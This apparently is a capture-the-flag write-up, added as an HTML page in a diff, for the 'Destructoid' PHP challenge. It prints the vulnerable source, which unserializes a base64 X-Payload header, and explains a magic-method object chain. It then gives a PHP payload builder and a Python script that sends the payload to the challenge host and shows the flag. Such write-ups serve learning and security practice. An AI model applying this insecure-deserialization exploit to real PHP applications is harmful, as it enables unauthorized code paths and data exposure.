@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Destruction</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav id="load-navbar"></nav>
+        <br />
+        <br />
+        <hr />    
+    </div>
+
+    <div id="tags">
+        <h5>Tags</h5>
+        <ul>
+            <li>php</li>
+            <li>deserialization</li>
+            <li>fuzzing</li>
+            <li>pop chain</li>
+        </ul>
+    </div>
+
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="Destructoid_0"></a>Destructoid</h1>
+<h2 class="code-line" data-line-start=2 data-line-end=3><a id="Description_2"></a>Description</h2>
+<p class="has-line-data" data-line-start="3" data-line-end="4"><a href="https://www.youtube.com/watch?v=zwpDmwKxulQ">https://www.youtube.com/watch?v=zwpDmwKxulQ</a></p>
+<h2 class="code-line" data-line-start=5 data-line-end=6><a id="Files_5"></a>Files</h2>
+<p class="has-line-data" data-line-start="6" data-line-end="7">No files.</p>
+<h2 class="code-line" data-line-start=8 data-line-end=9><a id="Methodology_8"></a>Methodology</h2>
+<p class="has-line-data" data-line-start="9" data-line-end="10">We somehow have to leak the source code of the webapp. After a bit of fuzzing we get it.</p>
+<p class="has-line-data" data-line-start="11" data-line-end="12"><a href="https://destructoid.chal.imaginaryctf.org/index.php?source">https://destructoid.chal.imaginaryctf.org/index.php?source</a></p>
+<pre><code class="has-line-data" data-line-start="14" data-line-end="62" class="language-php"> <span class="hljs-preprocessor">&lt;?php</span>
+<span class="hljs-variable">$printflag</span> = <span class="hljs-keyword">false</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">X</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(<span class="hljs-variable">$cleanup</span>)</span> </span>{
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cleanup</span> === <span class="hljs-string">"flag"</span>) {
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">"NO!\n"</span>);
+        }
+        <span class="hljs-variable">$this</span>-&gt;cleanup = <span class="hljs-variable">$cleanup</span>;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>{
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$this</span>-&gt;cleanup;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{
+        <span class="hljs-keyword">global</span> <span class="hljs-variable">$printflag</span>;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;cleanup !== <span class="hljs-string">"flag"</span> &amp;&amp; <span class="hljs-variable">$this</span>-&gt;cleanup !== <span class="hljs-string">"noflag"</span>) {
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">"No!\n"</span>);
+        }
+        <span class="hljs-keyword">include</span> <span class="hljs-variable">$this</span>-&gt;cleanup . <span class="hljs-string">".php"</span>;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$printflag</span>) {
+            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$FLAG</span> . <span class="hljs-string">"\n"</span>;
+        }
+    }
+}
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Y</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>{
+        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$this</span>-&gt;secret . <span class="hljs-string">"\n"</span>;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>{
+        <span class="hljs-keyword">global</span> <span class="hljs-variable">$printflag</span>;
+        <span class="hljs-variable">$printflag</span> = <span class="hljs-keyword">true</span>;
+        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> X(<span class="hljs-variable">$this</span>-&gt;secret))-&gt;cleanup;
+    }
+}
+
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'source'</span>])) {
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+    <span class="hljs-keyword">die</span>();
+}
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"ecruos? ym dnif uoy naC\n"</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_X_PAYLOAD'</span>])) {
+    unserialize(base64_decode(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_X_PAYLOAD'</span>]));
+}
+</code></pre>
+<p class="has-line-data" data-line-start="63" data-line-end="64">Clearly there is an <code>unserialize</code> method used which is our entrypoint of the exploit. We have to send our payload in the HTTP header but sending <code>HTTP_X_PAYLOAD</code> won’t work. Read the php docs and you will know we have to send the payload in <code>X-PAYLOAD</code> header.</p>
+<h2 class="code-line" data-line-start=65 data-line-end=66><a id="Exploit_65"></a>Exploit</h2>
+<p class="has-line-data" data-line-start="66" data-line-end="67">We will chain the magic methods to execute what we want.</p>
+<p class="has-line-data" data-line-start="68" data-line-end="69"><code>__destruct</code> and <code>__wakeup</code> will get called immediately upon unserialization.</p>
+<p class="has-line-data" data-line-start="70" data-line-end="71"><code>__construct</code> will get called when we create an object from <code>X</code>.</p>
+<p class="has-line-data" data-line-start="72" data-line-end="73"><code>__toString</code> will get called when we <code>echo</code> an object.</p>
+<p class="has-line-data" data-line-start="75" data-line-end="76">We start with <code>Y</code> and set <code>$secret</code> to <code>$this</code> so as to echo itself (class Y). Then the <code>__toString</code> of Y will be called and set <code>printflag</code> to <code>true</code> and create <code>new X</code> which we don’t care about (this trigger the printing of <code>No!</code>). The in the unserialization payload we also set some arbitrary variable to <code>new X(&quot;flag&quot;)</code>. This create new object of <code>X</code>, we already have <code>$printflag</code> set to <code>true</code> and we get the flag.</p>
+<h2 class="code-line" data-line-start=77 data-line-end=78><a id="Code_77"></a>Code</h2>
+<h3 class="code-line" data-line-start=78 data-line-end=79><a id="unserphp_78"></a><code>unser.php</code></h3>
+<pre><code class="has-line-data" data-line-start="80" data-line-end="97" class="language-php"><span class="hljs-preprocessor">&lt;?php</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">X</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(<span class="hljs-variable">$cleanup</span>)</span> </span>{
+        <span class="hljs-variable">$this</span>-&gt;cleanup = <span class="hljs-variable">$cleanup</span>;
+    }
+}
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Y</span> </span>{
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{
+        <span class="hljs-variable">$this</span>-&gt;secret = <span class="hljs-variable">$this</span>;
+        <span class="hljs-variable">$this</span>-&gt;mmmmmm = <span class="hljs-keyword">new</span> X(<span class="hljs-string">"flag"</span>);
+    }
+}
+
+<span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> Y());
+</code></pre>
+<h3 class="code-line" data-line-start=98 data-line-end=99><a id="exploitpy_98"></a><code>exploit.py</code></h3>
+<pre><code class="has-line-data" data-line-start="100" data-line-end="113" class="language-python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> subprocess
+<span class="hljs-keyword">import</span> base64
+
+result = subprocess.run([<span class="hljs-string">'php'</span>, <span class="hljs-string">'unser.php'</span>], stdout=subprocess.PIPE)
+pay = base64.b64encode(result.stdout)
+pay = pay.decode()
+
+h = {<span class="hljs-string">'X-PAYLOAD'</span>: pay}
+
+r = requests.get(<span class="hljs-string">'https://destructoid.chal.imaginaryctf.org/'</span>, headers=h)
+print(r.content.decode())
+</code></pre>
+<h2 class="code-line" data-line-start=114 data-line-end=115><a id="Loot_114"></a>Loot</h2>
+<p class="has-line-data" data-line-start="115" data-line-end="116"><img src="./loot.PNG" alt="loot"></p>
+<h2 class="code-line" data-line-start=117 data-line-end=118><a id="Flag_117"></a>Flag</h2>
+<p class="has-line-data" data-line-start="118" data-line-end="119"><strong>ictf{d3s3r14l1z4t10n_4nd_d3struct10n}</strong></p>
+
+    <script src="/js/navbar.js"></script>
+</body>
+
+</html>
